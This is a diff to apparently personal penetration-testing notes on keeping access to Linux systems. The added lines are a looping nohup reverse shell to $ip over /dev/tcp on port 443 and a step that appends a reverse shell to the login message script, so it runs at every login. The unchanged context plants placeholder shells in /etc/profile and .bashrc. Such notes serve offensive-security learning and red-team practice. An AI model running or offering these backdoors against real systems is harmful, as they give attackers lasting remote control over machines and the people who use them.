@@ -2,6 +2,17 @@
 
 For general overview of persistance that OS neutral: [[Persistence]].
 
+## Nohup
+
+Use `nohup` - no hang up in a script to make call back.  
+```bash
+#!/bin/bash
+while true; do
+    nohup bash -i >& /dev/tcp/$ip/443 0>&1;
+    sleep 10;
+done
+```
+
 
 #### Ippsec Timestamp checking
 
@@ -20,6 +31,14 @@ echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /etc/profile
 # consider .zshrc or dash.rc
 echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc 
 ```
+
+#### MOTD you got pwned
+
+```bash
+# When anyone logs in 
+echo "$revershell_goes_here" | sudo tee -a /etc/update-motd.d/00-header
+```
+
 
 
 #### SSH Keys
